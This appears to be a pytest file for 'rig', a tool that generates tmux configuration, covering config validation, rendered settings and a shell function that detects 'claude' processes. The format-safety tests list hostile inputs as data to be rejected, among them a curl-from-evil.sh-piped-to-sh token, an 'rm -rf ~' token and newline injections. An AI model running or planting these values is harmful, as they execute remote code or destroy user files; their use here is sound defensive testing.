"""tmux configuration provisioning — config, pure rendering, plan, install, drift.

rig MANAGES tmux config declaratively from rig.yaml, MIGRATING an existing hand-written
``~/.tmux.conf`` rather than clobbering it. Two apply mechanisms:

- **import** (preferred): rig owns a generated ``~/.config/rig/tmux/rig.tmux.conf`` and
  ``~/.tmux.conf`` carries a single ``source-file <that path>`` import line.
- **block** (fallback): rig splices a managed block between sentinel markers in
  ``~/.tmux.conf``, replacing only between the markers (conda-init style).

The root-cause fix this models: continuum's autosave hook lives in ``status-right``; the
Moshi ``set -g status-right ''`` tweak must run BEFORE continuum init (or never wipe its
hook), and continuum's ``run-shell`` init must be LAST so its hook survives. Because rig
GENERATES the managed region it can GUARANTEE that ordering.

All rendering here is stdlib-only + effect-free (the ``tmux`` module computes WHAT the
artifacts are); the effectful writes live in ``actions/runner.py`` and drift diffs the
desired artifacts against disk in ``drift.py`` — three consumers share one source of truth.
"""
from __future__ import annotations

from pathlib import Path

import pytest

from riglib import tmux
from riglib.config import ConfigError, validate
from tests.tmux_helpers import _build, _plan


# ── config validation ───────────────────────────────────────────────────────────────────
def test_tmux_block_accepted():
    validate({"version": 1, "tmux": {"enabled": True}})


def test_tmux_block_empty_ok():
    validate({"version": 1, "tmux": {}})


def test_tmux_full_block_accepted():
    validate(
        {
            "version": 1,
            "tmux": {
                "enabled": True,
                "apply": "import",
                "conf_path": "~/.tmux.conf",
                "generated_dir": "~/.config/rig/tmux",
                "resurrect": {
                    "processes": ["claude", "ssh", "psql"],
                    "capture_pane_contents": True,
                },
                "continuum": {
                    "restore": True,
                    "save_interval": 15,
                    "boot": True,
                },
                "moshi": {"enabled": True},
                "cc_restore": {"enabled": True},
                "omp_restore": {"enabled": True},
                "codex_restore": {"enabled": True},
                "anti_sprawl": {"enabled": True, "session": "main"},
                "boot": {"enabled": True},
                "focus_events": {"enabled": True},
            },
        }
    )


def test_tmux_unknown_key_rejected():
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"nope": 1}})


def test_tmux_enabled_must_be_bool():
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"enabled": "yes"}})


def test_tmux_apply_enum_rejected():
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"apply": "splice"}})


@pytest.mark.parametrize("bad", [None, ["import"], 1, {"x": 1}])
def test_tmux_apply_present_non_enum_rejected(bad):
    """A PRESENT `apply` must be a valid enum string — null (→ str("None")) and unhashable
    values (→ raw TypeError) must fail closed, not slip through (codex P2)."""
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"apply": bad}})


@pytest.mark.parametrize("good", ["import", "block"])
def test_tmux_apply_enum_accepted(good):
    validate({"version": 1, "tmux": {"apply": good}})


def test_tmux_resurrect_processes_must_be_list_of_str():
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"resurrect": {"processes": "claude"}}})


def test_tmux_save_interval_must_be_positive_int():
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"continuum": {"save_interval": 0}}})
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"continuum": {"save_interval": -5}}})
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"continuum": {"save_interval": True}}})


def test_tmux_unknown_nested_key_rejected():
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"moshi": {"enable": True}}})  # typo: enable


def test_tmux_focus_events_block_accepted():
    validate({"version": 1, "tmux": {"focus_events": {"enabled": True}}})
    validate({"version": 1, "tmux": {"focus_events": {"enabled": False}}})


def test_tmux_focus_events_enabled_must_be_bool():
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"focus_events": {"enabled": "yes"}}})


def test_tmux_focus_events_unknown_key_rejected():
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"focus_events": {"enable": True}}})  # typo: enable


def test_tmux_boot_label_must_be_string():
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"boot": {"label": 123}}})
    validate({"version": 1, "tmux": {"boot": {"label": "com.me.tmux"}}})


def test_tmux_autosave_knobs_validate():
    # enabled must be bool, label must be str, stale_after must be int >= 1 (bool rejected).
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"autosave": {"enabled": "yes"}}})
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"autosave": {"label": 123}}})
    for bad in (0, -1, True):
        with pytest.raises(ConfigError):
            validate({"version": 1, "tmux": {"autosave": {"stale_after": bad}}})
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"autosave": {"nope": 1}}})  # unknown nested key
    validate({"version": 1, "tmux": {"autosave": {"enabled": True, "label": "com.me.save", "stale_after": 30}}})


def test_tmux_login_shell_block_accepted():
    validate({"version": 1, "tmux": {"login_shell": {"enabled": True, "shell": "/bin/zsh"}}})
    validate({"version": 1, "tmux": {"login_shell": {"enabled": False}}})


def test_tmux_login_shell_enabled_must_be_bool():
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"login_shell": {"enabled": "yes"}}})


def test_tmux_login_shell_shell_must_be_string():
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"login_shell": {"shell": 123}}})


def test_tmux_login_shell_shell_must_be_absolute_path():
    """A non-empty shell override must be an ABSOLUTE path to the BINARY with NO args (rig adds
    `-l`). A relative name, OR an absolute path WITH args (`/bin/zsh -l` — the review-caught case
    that passed `startswith('/')` but rendered `'/bin/zsh -l' -l`), is rejected."""
    for bad in ("zsh", "zsh -l", "bin/zsh", "/bin/zsh -l", "/bin/zsh --login", "/opt/My App/zsh"):
        with pytest.raises(ConfigError):
            validate({"version": 1, "tmux": {"login_shell": {"shell": bad}}})
    # empty (use $SHELL) and a bare absolute binary path are both fine.
    validate({"version": 1, "tmux": {"login_shell": {"shell": ""}}})
    validate({"version": 1, "tmux": {"login_shell": {"shell": "/usr/bin/fish"}}})


# ── pane_titles config validation ─────────────────────────────────────────────────────────
def test_tmux_pane_titles_block_accepted():
    validate({"version": 1, "tmux": {"pane_titles": {"enabled": True, "position": "top", "format": "#{pane_title}"}}})
    validate({"version": 1, "tmux": {"pane_titles": {"enabled": False}}})


def test_tmux_pane_titles_enabled_must_be_bool():
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"pane_titles": {"enabled": "yes"}}})


@pytest.mark.parametrize("bad", ["bottom-left", "middle", 1, ["top"]])
def test_tmux_pane_titles_position_enum_rejected(bad):
    """A PRESENT non-null `position` must be a valid enum string. `position: null` is treated
    like every other tmux knob's explicit null — 'use the default' — not an error."""
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"pane_titles": {"position": bad}}})


def test_tmux_pane_titles_position_null_falls_back_to_default():
    validate({"version": 1, "tmux": {"pane_titles": {"position": None}}})


@pytest.mark.parametrize("good", ["top", "bottom"])
def test_tmux_pane_titles_position_enum_accepted(good):
    validate({"version": 1, "tmux": {"pane_titles": {"position": good}}})


def test_tmux_pane_titles_format_must_be_string():
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"pane_titles": {"format": 123}}})


@pytest.mark.parametrize(
    "bad",
    [
        '#{pane_title}"',  # closes the tmux double-quoted option value early
        "#{pane_title}\\",  # can escape into the closing quote
        "$HOME #{pane_title}",  # tmux expands ${VAR} inside a double-quoted value
        "#{pane_title}\n set -g status-left 'x'",  # newline injects a second tmux directive
        "#{pane_title}\r",  # carriage return — also a control char
        "#{pane_title}\x7f",  # DEL — non-printable, outside the ASCII control range
        "#{pane_title} #(curl -s evil.sh | sh)",  # tmux's shell-exec format token — RCE, not corruption
        "#(rm -rf ~)",  # the whole value is a shell-exec token
    ],
)
def test_tmux_pane_titles_format_rejects_unsafe_characters(bad):
    """A `"`, `\\`, `$`, `#(`, or non-printable character in `format` would corrupt, inject
    into, or (for `#(`) RUN A SHELL COMMAND from the generated tmux config (review: `#(...)` is
    tmux's own shell-exec format token — it re-executes on every border render, on a timer, for
    the life of the server; strictly worse than the corruption cases)."""
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"pane_titles": {"format": bad}}})


def test_tmux_pane_titles_format_safe_tokens_accepted():
    validate(
        {
            "version": 1,
            "tmux": {
                "pane_titles": {
                    "format": "#{pane_index}: #{pane_title} [#{session_name}/#{window_name}]"
                }
            },
        }
    )


def test_tmux_pane_titles_format_tab_and_empty_string_accepted():
    """A bare tab is harmless inside a double-quoted tmux option value (unlike newline/CR); an
    empty format string is a degenerate-but-safe value (renders `pane-border-format ""`)."""
    validate({"version": 1, "tmux": {"pane_titles": {"format": "#{pane_title}\t#{pane_index}"}}})
    validate({"version": 1, "tmux": {"pane_titles": {"format": ""}}})


def test_tmux_pane_titles_format_powerline_glyphs_accepted():
    """A Powerline/Nerd-Font separator glyph (category Co/Cf, NOT a true control character) must
    be accepted — it cannot corrupt a double-quoted tmux value, and Powerline glyphs are common
    in a real pane-border-format (review: `str.isprintable()` would have wrongly rejected this)."""
    validate({"version": 1, "tmux": {"pane_titles": {"format": "#{pane_title}  #{pane_index}"}}})


def test_tmux_pane_titles_non_dict_value_raises_config_error_not_raw_exception():
    """`pane_titles: "top"` (a scalar, not a mapping) must fail as a `ConfigError` with a fix
    hint — not escape as a raw `TypeError`/`ValueError` from a later `dict(...)` call in
    plan.py/runner.py that assumes the block already validated as a mapping."""
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"pane_titles": "top"}})
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"pane_titles": ["top"]}})


# ── pane_titles format safety: the Python check and the published JSON schema must agree ──────
@pytest.mark.parametrize(
    "candidate",
    [
        "#{pane_title}",
        "#{session_name} #{window_index}:#{window_name}#{window_flags}",
        "#{pane_title}\t#{pane_index}",
        "",
        "#{pane_title}  #{pane_index}",  # Powerline glyph — safe
        "\U0001f600 #{pane_title}",  # emoji — safe
        '#{pane_title}"',
        "#{pane_title}\\",
        "$HOME #{pane_title}",
        "#{pane_title}\n set -g status-left 'x'",
        "#{pane_title}\r",
        "#{pane_title}\x7f",
        "#{pane_title} #(curl -s evil.sh | sh)",
        "#(rm -rf ~)",
        "#{pane_title} injected",  # U+2028 LINE SEPARATOR
        "#{pane_title} injected",  # U+2029 PARAGRAPH SEPARATOR
    ],
)
def test_pane_titles_format_python_check_matches_json_schema_pattern(candidate):
    """The two `format`-safety gates — `tmux._pane_titles_format_is_safe` (runtime) and
    `config_schema.TMUX_PANE_TITLES_FORMAT_UNSAFE_PATTERN` (the published JSON schema, for
    editors/CI validating rig.yaml offline) — both claim to express the SAME rule. Nothing
    enforced that claim (review), so run a shared corpus through both and assert identical
    verdicts on every entry, safe and unsafe alike."""
    import re

    from riglib import config_schema
    from riglib.tmux import _pane_titles_format_is_safe

    python_says_safe = _pane_titles_format_is_safe(candidate)
    schema_says_unsafe = bool(re.search(config_schema.TMUX_PANE_TITLES_FORMAT_UNSAFE_PATTERN, candidate))
    assert python_says_safe == (not schema_says_unsafe), (
        f"{candidate!r}: python safe={python_says_safe}, schema unsafe={schema_says_unsafe}"
    )


def test_tmux_pane_titles_clear_status_right_must_be_bool():
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"pane_titles": {"clear_status_right": "yes"}}})
    validate({"version": 1, "tmux": {"pane_titles": {"clear_status_right": False}}})


def test_tmux_pane_titles_unknown_key_rejected():
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"pane_titles": {"postion": "top"}}})  # typo


def test_tmux_login_shell_unknown_key_rejected():
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {"login_shell": {"bogus": True}}})


def test_tmux_enabled_null_is_accepted_and_provisions():
    """`enabled: null` (explicit None) is valid and, per the docs ('not false' provisions),
    must NOT be treated as disabled."""
    validate({"version": 1, "tmux": {"enabled": None}})


@pytest.mark.parametrize("pathkey", ["conf_path", "generated_dir"])
def test_tmux_null_path_key_rejected(pathkey):
    """A present-but-null path key must FAIL CLOSED — it can't fall back to a default, and the
    plan would otherwise resolve a literal `None` path (codex P2)."""
    with pytest.raises(ConfigError):
        validate({"version": 1, "tmux": {pathkey: None}})


def test_tmux_absent_path_key_is_fine():
    """An ABSENT path key is fine — it uses the documented default."""
    validate({"version": 1, "tmux": {"enabled": True}})


def test_default_resurrect_processes_excludes_claude_when_cc_restore_on():
    """When cc_restore is ON (default), `claude` must NOT be in @resurrect-processes: resurrect
    would restart the pane as a bare `claude` (a NEW/default session) before cc-restore runs,
    and cc-restore — which (correctly) only resumes a FRESH SHELL — would then skip it, leaving
    the wrong session. cc-restore owns the exact `claude --resume <id>` instead. (codex P2.)
    """
    conf = _plan().render_rig_conf()
    line = next(ln for ln in conf.splitlines() if "@resurrect-processes" in ln)
    assert "claude" not in line  # cc-restore owns claude resume; resurrect brings back the shell
    # cc-restore wiring is what restores claude, by exact id.
    assert "@resurrect-hook-post-restore-all" in conf and "cc-restore.sh" in conf


def test_claude_in_resurrect_processes_when_cc_restore_off():
    """With cc_restore OFF, the user opted out of exact-id resume, so `claude` IS added to
    @resurrect-processes — resurrect's own best-effort restore (bare `claude`) is then the only
    mechanism, which is the documented fallback."""
    conf = tmux.build_tmux(repo_home=Path("/home/u"), cc_restore={"enabled": False}).render_rig_conf()
    line = next(ln for ln in conf.splitlines() if "@resurrect-processes" in ln)
    assert "claude" in line


def test_default_resurrect_processes_excludes_omp_and_codex_when_their_restore_on():
    """omp/codex mirror claude: their own name is excluded from @resurrect-processes while
    their `*_restore` is on (default) — their own `*-restore` script owns the exact resume."""
    conf = _plan().render_rig_conf()
    line = next(ln for ln in conf.splitlines() if "@resurrect-processes" in ln)
    assert "omp" not in line.split("'")[1].split()
    assert "codex" not in line.split("'")[1].split()


def test_omp_added_to_resurrect_processes_when_omp_restore_off():
    conf = tmux.build_tmux(repo_home=Path("/home/u"), omp_restore={"enabled": False}).render_rig_conf()
    line = next(ln for ln in conf.splitlines() if "@resurrect-processes" in ln)
    assert "omp" in line.split("'")[1].split()


def test_codex_added_to_resurrect_processes_when_codex_restore_off():
    conf = tmux.build_tmux(repo_home=Path("/home/u"), codex_restore={"enabled": False}).render_rig_conf()
    line = next(ln for ln in conf.splitlines() if "@resurrect-processes" in ln)
    assert "codex" in line.split("'")[1].split()


def test_omp_restore_off_does_not_affect_codex_or_claude_exemption():
    """Turning one harness's restore off must not disturb the other two's exemption."""
    conf = tmux.build_tmux(repo_home=Path("/home/u"), omp_restore={"enabled": False}).render_rig_conf()
    line = next(ln for ln in conf.splitlines() if "@resurrect-processes" in ln)
    procs = line.split("'")[1].split()
    assert "omp" in procs
    assert "claude" not in procs
    assert "codex" not in procs


def test_render_capture_pane_contents_on():
    conf = _plan().render_rig_conf()
    assert "set -g @resurrect-capture-pane-contents 'on'" in conf


def test_render_continuum_restore_on():
    conf = _plan().render_rig_conf()
    assert "set -g @continuum-restore 'on'" in conf


def test_render_continuum_boot_is_always_off():
    """rig NEVER emits `@continuum-boot 'on'` — that makes continuum install its OWN unmanaged
    boot artifact (the iTerm-coupled Tmux.Start.plist). rig's launchd agent is the boot path, so
    continuum's boot stays off (codex P2)."""
    # default boot.enabled=True still keeps continuum-boot OFF (rig's launchd agent owns boot).
    assert "set -g @continuum-boot 'off'" in _plan().render_rig_conf()
    assert "set -g @continuum-boot 'on'" not in _plan().render_rig_conf()
    # even with the legacy continuum.boot knob true, it's a no-op — still off.
    conf = tmux.build_tmux(repo_home=Path("/home/u"), continuum={"boot": True}).render_rig_conf()
    assert "set -g @continuum-boot 'off'" in conf and "set -g @continuum-boot 'on'" not in conf


def test_render_save_interval():
    # With the independent autosave agent OFF, continuum keeps its own save at save_interval.
    conf = tmux.build_tmux(
        repo_home=Path("/home/u"), continuum={"save_interval": 7}, autosave={"enabled": False}
    ).render_rig_conf()
    assert "set -g @continuum-save-interval '7'" in conf


def test_render_disabled_booleans_emit_explicit_off():
    """A disabled modeled boolean must emit an EXPLICIT 'off' (not just be omitted), so the
    generated tail OVERRIDES a preserved inline `'on'` from a migrated conf (codex P2)."""
    conf = tmux.build_tmux(
        repo_home=Path("/home/u"),
        continuum={"restore": False, "boot": False},
        resurrect={"capture_pane_contents": False},
    ).render_rig_conf()
    assert "set -g @continuum-restore 'off'" in conf
    assert "set -g @continuum-boot 'off'" in conf
    assert "set -g @resurrect-capture-pane-contents 'off'" in conf


def test_render_focus_events_default_on():
    """focus-events is a plain terminal-capability toggle, default-on (Alex, 2026-08-05):
    absent a `tmux.focus_events` block, the generated conf must report focus in/out events."""
    conf = _plan().render_rig_conf()
    assert "set -g focus-events on" in conf


def test_render_focus_events_off_is_explicit():
    """Same explicit-off contract as every other modeled boolean: `enabled: false` must emit
    'off' (not omit the line), so it overrides a preserved inline value from a migrated conf."""
    conf = tmux.build_tmux(
        repo_home=Path("/home/u"), focus_events={"enabled": False}
    ).render_rig_conf()
    assert "set -g focus-events off" in conf
    assert "set -g focus-events on" not in conf


def test_cc_save_avoids_ls_head_pipe():
    """cc-save must NOT use `ls -t … | head -n1` (SIGPIPE under pipefail drops the pane) — it
    takes the first line of captured ls output instead (codex P2)."""
    body = _plan().render_cc_save()
    # check the EXECUTABLE lines only (a comment may explain why we avoid the pipe).
    code_lines = [ln for ln in body.splitlines() if not ln.lstrip().startswith("#")]
    assert not any("head -n1" in ln for ln in code_lines)
    # the first-line-of-listing parameter expansion replaces the pipe.
    assert any("listing" in ln and "newest=" in ln for ln in code_lines)


# ── DEFECT 2: cc-save must detect claude by the pane's PROCESS TREE, not the command string ──
def test_cc_save_walks_pane_process_tree_not_command_string():
    """DEFECT 2 (the reboot bug): cc shows up in `pane_current_command` as its VERSION string
    (e.g. `2.1.178`), and the real `claude` process is a CHILD of the pane's shell. Filtering on
    `pane_current_command == claude` therefore matched NOTHING → the map was always empty → cc
    never resumed. cc-save must walk the pane's process TREE (pane_pid + descendants) for a
    process whose command is `claude` / `*/claude`."""
    body = _plan().render_cc_save()
    # it must enumerate the pane PID + its descendants (a tree walk), not just read the command.
    assert "pane_pid" in body or "#{pane_pid}" in body
    # the OLD broken filter on the command string must be GONE from the EXECUTABLE code (a
    # comment may still reference it to explain WHY the tree walk replaced it).
    code_lines = [ln for ln in body.splitlines() if not ln.lstrip().startswith("#")]
    assert not any("pane_current_command" in ln for ln in code_lines)
    # a process-tree walk: descend children via ppid (ps -o pid,ppid or pgrep -P).
    assert "ppid" in body or "pgrep -P" in body


def test_cc_save_matches_claude_basename_in_the_tree():
    """The matched descendant's command is `claude` or `*/claude` (an absolute path to the
    binary), never a substring like `claudette` — match the basename."""
    body = _plan().render_cc_save()
    assert "claude" in body
    # it must record the pane→cwd→session-id map (the whole point) once a claude descendant is found.
    assert "MAP_FILE" in body and ".jsonl" in body


def test_cc_save_matches_the_versioned_binary_path():
    """The generated match must also cover the versioned-binary install (the 2026-06-17 incident):
    cc launched by its resolved path reports `comm` of `.../claude/versions/<version>`, basename =
    the version, not `claude`. The case-glob must include the `*/claude/versions/*` arm or that
    process is invisible to the tree walk (the map stays empty → cc never resumes)."""
    body = _plan().render_cc_save()
    assert "*/claude/versions/*" in body


def test_cc_save_still_records_cwd_and_session_id():
    """Detection changed (tree walk), but the RECORDED data is unchanged: pane addr, cwd, id."""
    body = _plan().render_cc_save()
    assert "pane_current_path" in body or "#{pane_current_path}" in body
    assert "encode_cwd" in body
    assert "newest_session_id" in body


def _run_pane_has_claude(snapshot: str, root: str) -> int:
    """Extract the REAL `pane_has_claude` BFS from the generated cc-save script and run it against
    a SYNTHETIC ps snapshot — HERMETIC (no tmux/network/real processes), so the tree-walk logic is
    covered even when the e2e is opted out (opus finding: the BFS was only exercised in the e2e).
    The snapshot lines are `<pid> <ppid> <args>` (args = the full command line, as the production
    `ps -eo pid=,ppid=,args=` emits — argv[0] is the executable the matcher keys on).
    Returns the function's exit code (0 = a `claude` descendant of `root` was found)."""
    import shlex
    import subprocess
    import textwrap

    body = _plan().render_cc_save()
    # pull out the pane_has_claude() function definition (from its `pane_has_claude() {` to the
    # matching closing brace at column 0 — the script formats it that way).
    start = body.index("pane_has_claude() {")
    end = body.index("\n}\n", start) + len("\n}\n")
    fn = body[start:end]
    script = textwrap.dedent(f"""\
        set -euo pipefail
        PS_SNAPSHOT={shlex.quote(snapshot)}
        {fn}
        if pane_has_claude {shlex.quote(root)}; then exit 0; else exit 1; fi
    """)
    return subprocess.run(["bash", "-c", script], capture_output=True, text=True).returncode


def test_pane_has_claude_finds_a_direct_child():
    """The pane's direct child is `claude` → detected (the common case: cc is a child of the shell)."""
    snap = "100 1 bash\n200 100 claude\n300 100 sleep\n"
    assert _run_pane_has_claude(snap, "100") == 0


def test_pane_has_claude_finds_a_deep_descendant():
    """A `claude` two levels down (shell → node → claude) is still found by the BFS."""
    snap = "100 1 bash\n200 100 node\n300 200 claude\n"
    assert _run_pane_has_claude(snap, "100") == 0


def test_pane_has_claude_matches_absolute_path_basename():
    """A descendant reported by its absolute path (`/opt/homebrew/bin/claude`) matches `*/claude`."""
    snap = "100 1 zsh\n200 100 /opt/homebrew/bin/claude\n"
    assert _run_pane_has_claude(snap, "100") == 0


def test_pane_has_claude_matches_versioned_binary_under_claude_versions():
    """THE 2026-06-17 INCIDENT: cc installs as a symlink ~/.local/bin/claude ->
    .../claude/versions/<version>. Launched by the RESOLVED path, `ps comm` reports the full path
    whose basename is the VERSION string (`2.1.179`), not `claude` — so a basename-only match
    missed it and the cc map stayed empty (cc never resumed after a reboot). The tree walk must
    catch a descendant whose path is under `.../claude/versions/`."""
    snap = "100 1 /bin/zsh\n200 100 /Users/u/.local/share/claude/versions/2.1.179\n300 200 sleep\n"
    assert _run_pane_has_claude(snap, "100") == 0


def test_pane_has_claude_versioned_binary_deep_in_tree():
    """The versioned cc binary several levels below the pane shell is still found by the BFS."""
    snap = (
        "100 1 zsh\n"
        "200 100 node\n"
        "300 200 /Users/u/.local/share/claude/versions/3.0.0-beta.1\n"
    )
    assert _run_pane_has_claude(snap, "100") == 0


def test_pane_has_claude_no_false_positive_on_unrelated_versioned_path():
    """A numeric-named process NOT under `claude/versions/` (e.g. a runtime under its own
    `versions/` dir, or a bare version-named binary) must NOT match — the `claude/versions/`
    path segment is required, so the rule can't be tripped by any dotted-numeric basename."""
    snap = (
        "100 1 bash\n"
        "200 100 /opt/node/versions/20.11.0/bin/node\n"   # node, not claude
        "300 100 /usr/local/foo/2.1.179\n"                # bare version, no claude/versions/
    )
    assert _run_pane_has_claude(snap, "100") != 0


def test_pane_has_claude_matches_versioned_binary_with_args():
    """The versioned binary launched WITH arguments (`…/claude/versions/2.1.179 --resume`) still
    matches — the matcher keys on argv[0] (the executable path), ignoring the trailing args."""
    snap = "100 1 /bin/zsh\n200 100 /Users/u/.local/share/claude/versions/2.1.179 --resume\n"
    assert _run_pane_has_claude(snap, "100") == 0


def test_pane_has_claude_ignores_claude_only_in_arguments():
    """`claude` appearing only as an ARGUMENT (not argv[0]) must NOT match — the matcher reads
    argv[0] only, so `vim claude-notes.md` / `grep claude` / `cat ~/claude/x` is not a cc pane."""
    snap = (
        "100 1 bash\n"
        "200 100 /usr/bin/vim claude-notes.md\n"
        "300 100 /usr/bin/grep claude /var/log/x\n"
    )
    assert _run_pane_has_claude(snap, "100") != 0


def test_pane_has_claude_matches_symlink_launch_with_args():
    """The common live case: `claude --resume` (argv[0] == `claude`, launched via the symlink)
    matches even with trailing args — argv[0] basename equality."""
    snap = "100 1 zsh\n200 100 claude --resume\n"
    assert _run_pane_has_claude(snap, "100") == 0


def test_pane_has_claude_does_not_false_match_claude_versions_in_an_argument():
    """REGRESSION GUARD (review finding, 2 models): `claude/versions/` appearing in an ARGUMENT
    (not argv[0]) must NOT mark the pane as cc — else a routine command writes a bogus cc-map entry.
    The matcher keys on argv[0] (the executable) only, so a `grep`/`ls`/`tar` over the versions dir,
    or a `cp` of a `claude` file, is correctly ignored."""
    for argline in (
        "/bin/grep -r foo /home/u/.local/share/claude/versions/",
        "/bin/ls /home/u/.local/share/claude/versions/",
        "/usr/bin/tar czf b.tgz /home/u/.local/share/claude/versions/2.1.179",
        "/bin/cp /opt/claude /tmp/",
        "/usr/bin/find / -path */claude/versions*",
    ):
        snap = f"100 1 bash\n200 100 {argline}\n"
        assert _run_pane_has_claude(snap, "100") != 0, argline


def test_pane_has_claude_no_match_on_notclaude_versions_path():
    """The `*/claude/versions/*` glob requires `claude` to be a real path SEGMENT: a sibling
    project like `/opt/notclaude/versions/2.0.0` (or `myclaude`) must NOT false-match."""
    snap = "100 1 bash\n200 100 /opt/notclaude/versions/2.0.0 --x\n"
    assert _run_pane_has_claude(snap, "100") != 0


def test_pane_has_claude_spaced_install_path_is_a_known_limitation():
    """DOCUMENTED LIMITATION (review finding): an install path containing a SPACE
    (`/Users/J D/.local/share/claude/versions/2.1.179`) is NOT detected — argv[0] cannot be
    isolated from `ps args` when it contains a space, and the whole-line match that would cover it
    reintroduces the argument false-positives above. The default `~/.local/share/claude/versions/`
    path has no space, so this never bites a normal install. This test PINS the accepted behavior
    (not an aspiration): if a future change makes spaced paths match, revisit the false-positive
    trade-off in `pane_has_claude` deliberately."""
    snap = "100 1 /bin/zsh\n200 100 /Users/J D/.local/share/claude/versions/2.1.179 --resume\n"
    assert _run_pane_has_claude(snap, "100") != 0


def test_pane_has_claude_spaced_path_symlink_arm_is_a_known_limitation():
    """Same accepted limitation for the plain `*/claude` symlink arm: a `claude` binary under a
    path with a SPACE (`/Users/J D/bin/claude`) is truncated at the space and NOT detected. Pinned
    so the symlink arm's contract can't silently change either (paired with the versions-arm pin)."""
    snap = "100 1 zsh\n200 100 /Users/J D/bin/claude --resume\n"
    assert _run_pane_has_claude(snap, "100") != 0


def test_pane_has_claude_ignores_wrapper_launch_with_claude_in_argv1():
    """DOCUMENTED LIMITATION: a WRAPPER that rewrites argv[0] (`npx claude`, `node …/cli.js`) puts
    the real claude in argv[1+], so it is NOT detected — matching argv[1+] would resurrect the
    argument false-positives. The canonical installs exec the binary directly (argv[0] = claude),
    so this is an accepted miss. Pinned to make the trade-off explicit."""
    snap = (
        "100 1 bash\n"
        "200 100 /usr/bin/node /home/u/.local/share/claude/cli.js\n"
        "300 100 /usr/bin/npx claude --resume\n"
    )
    assert _run_pane_has_claude(snap, "100") != 0


def test_pane_has_claude_tolerates_empty_or_bracketed_args_lines():
    """A degenerate snapshot line — an empty `args` (kernel/zombie) or a bracketed kernel-thread
    name (`[kthreadd]`) — must neither match nor error out the BFS (it just isn't a cc process)."""
    snap = "100 1 bash\n200 100 [kthreadd]\n300 100 \n"  # 300 has empty args
    assert _run_pane_has_claude(snap, "100") != 0


def test_pane_has_claude_no_match_when_absent():
    """No `claude` anywhere in the tree → not found (exit non-zero)."""
    snap = "100 1 bash\n200 100 vim\n300 100 less\n"
    assert _run_pane_has_claude(snap, "100") != 0


def test_pane_has_claude_does_not_match_substring():
    """A `claudette` process is NOT a `claude` match (basename equality, not substring)."""
    snap = "100 1 bash\n200 100 claudette\n"
    assert _run_pane_has_claude(snap, "100") != 0


def test_pane_has_claude_ignores_claude_outside_the_subtree():
    """A `claude` that is NOT a descendant of the queried pane is ignored (no false positive)."""
    snap = "100 1 bash\n200 100 sleep\n900 1 claude\n"  # 900 is a sibling, not under 100
    assert _run_pane_has_claude(snap, "100") != 0


# ── DEFECT 3: restored panes must be LOGIN shells (so ~/.zprofile / PATH is sourced) ─────────
def test_render_default_command_is_a_login_shell():
    """DEFECT 3 (the reboot bug): resurrect restores panes with a NON-login shell (resurrect's
    `default-command ''`), so `~/.zprofile` (PATH etc.) is NOT sourced → restored panes have a
    broken env. The generated config must set a login-shell default-command."""
    conf = _plan().render_rig_conf()
    assert "set -g default-command" in conf
    # a login shell: the user's $SHELL with -l (so ~/.zprofile / ~/.bash_profile is sourced).
    assert "-l" in conf
    line = next(ln for ln in conf.splitlines() if "default-command" in ln)
    assert "SHELL" in line or "/bin/" in line


def test_login_shell_default_command_is_default_on():
    """The login-shell default-command defaults ON (the safe value); a plan with no login_shell
    block still emits it."""
    assert "set -g default-command" in tmux.build_tmux(repo_home=Path("/home/u")).render_rig_conf()


def test_login_shell_can_be_disabled():
    """Configurable: `login_shell.enabled: false` omits the default-command (the user keeps
    resurrect's default non-login behavior)."""
    conf = tmux.build_tmux(
        repo_home=Path("/home/u"), login_shell={"enabled": False}
    ).render_rig_conf()
    assert "set -g default-command" not in conf


def test_login_shell_honors_configured_shell():
    """An explicit `login_shell.shell` is used verbatim (e.g. a non-default shell binary)."""
    conf = tmux.build_tmux(
        repo_home=Path("/home/u"), login_shell={"enabled": True, "shell": "/usr/bin/fish"}
    ).render_rig_conf()
    line = next(ln for ln in conf.splitlines() if "default-command" in ln)
    assert "/usr/bin/fish" in line and "-l" in line


def test_plan_resolves_login_shell_to_a_concrete_path(fake_agent_tools, tmp_path, monkeypatch):
    """DETERMINISM (review): the plan resolves an EMPTY login_shell.shell to a CONCRETE absolute
    path at plan time and bakes it — so render does NOT depend on $SHELL/FS at render time."""
    plan = _build({"tmux": {"enabled": True}}, tmp_path, fake_agent_tools)
    a = next(act for act in plan.actions if act.kind == "provision_tmux")
    baked = a.options["login_shell"]["shell"]
    assert baked.startswith("/") and " " not in baked  # a concrete absolute binary path


def test_login_shell_resolves_from_passwd_not_ambient_shell(monkeypatch):
    """The resolver reads the PASSWD database (stable login shell), NOT the volatile $SHELL env —
    so it is identical whatever $SHELL is set to (review P1: $SHELL-based resolve flapped)."""
    import os
    import pwd

    from riglib import tmux as tmod

    real = pwd.getpwuid(os.getuid()).pw_shell
    if not real.startswith("/"):
        pytest.skip("no absolute passwd shell on this host")
    monkeypatch.setenv("SHELL", "/some/other/shell-XYZ")  # $SHELL differs from passwd
    assert tmod.resolve_login_shell() == real  # passwd wins, $SHELL ignored


